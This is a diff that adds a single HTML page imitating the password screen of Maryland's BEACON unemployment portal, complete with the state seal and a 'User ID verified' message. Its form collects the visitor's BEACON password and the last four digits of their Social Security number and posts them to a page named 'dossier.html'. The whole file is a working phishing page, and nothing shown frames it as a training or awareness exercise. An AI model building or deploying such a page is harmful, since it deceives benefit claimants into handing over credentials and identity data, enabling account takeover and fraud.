@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Maryland BEACON - Password Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 30px; border-radius: 5px; box-shadow: 0px 0px 15px rgba(0,0,0,0.2); width: 380px; text-align: center; border-top: 8px solid #003366; }
+        img.seal { width: 80px; margin-bottom: 10px; }
+        h2 { color: #333; font-size: 18px; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; }
+        button { width: 95%; padding: 12px; background-color: #003366; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 15px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img class="seal" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Seal_of_Maryland.svg/1200px-Seal_of_Maryland.svg.png">
+        <h2>Enter Password</h2>
+        <p style="font-size: 13px; color: #666;">User ID verified. Please enter your password to access your account.</p>
+        <form action="dossier.html">
+            <input type="password" name="Password" placeholder="Enter BEACON Password" required>
+            <input type="text" name="SSN_Last4" placeholder="Last 4 Digits of SSN" required>
+            <button type="submit">VERIFY SECURITY CREDENTIALS</button>
+        </form>
+    </div>
+</body>
+</html>
